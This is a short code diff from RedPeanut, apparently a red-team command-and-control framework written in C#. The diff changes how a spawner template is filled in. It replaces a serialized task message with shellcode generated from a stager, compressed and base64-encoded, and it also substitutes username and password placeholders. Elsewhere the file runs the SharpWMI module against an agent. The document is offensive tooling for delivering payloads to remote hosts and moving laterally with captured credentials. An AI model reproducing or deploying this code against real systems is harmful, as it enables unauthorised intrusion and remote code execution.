@@ -176,27 +176,11 @@ namespace RedPeanut
                         //Create TaskMsg gzip
                         if (agent != null)
                         {
-                            ModuleConfig modconfig = new ModuleConfig
-                            {
-                                Assembly = stagerstr,
-                                Method = "Execute",
-                                Moduleclass = "RedPeanutRP",
-                                Parameters = new string[] { "pippo" }
-                            };
+                             
 
-                            TaskMsg task = new TaskMsg
-                            {
-                                TaskType = "module",
-                                ModuleTask = modconfig,
-                                Agentid = agent.AgentId
-                            };
-
-                            if (agent.Pivoter != null)
-                                task.AgentPivot = agent.Pivoter.AgentId;
-
+                            
                             source = File.ReadAllText(Path.Combine(folderrpath, SPAWNER_TEMPLATE))
-                            .Replace("#NUTCLR#", ReadResourceFile(PL_COMMAND_NUTCLRWNF))
-                            .Replace("#TASK#", Convert.ToBase64String(CompressGZipAssembly(Encoding.Default.GetBytes(JsonConvert.SerializeObject(task)))))
+                            .Replace("#NUTCLR#", Convert.ToBase64String(CompressGZipAssembly(Builder.GenerateShellcode(stagerstr, RandomString(10, new Random()) + ".exe", "RedPeanutRP", "Main", new string[] { "" }))))
                             .Replace("#SPAWN#", Program.GetC2Manager().GetC2Server().GetProfile(profile).Spawn)
                             .Replace("#USERNAME#", username)
                             .Replace("#PASSWORD#", password)
@@ -245,7 +229,6 @@ namespace RedPeanut
                                 s += ss;
                             Console.WriteLine("String command: " + s);
                             RunAssembly(PL_MODULE_SHARPWMI, "SharpWMI.Program", args.ToArray(), agent);
-
 
                         }
                     }
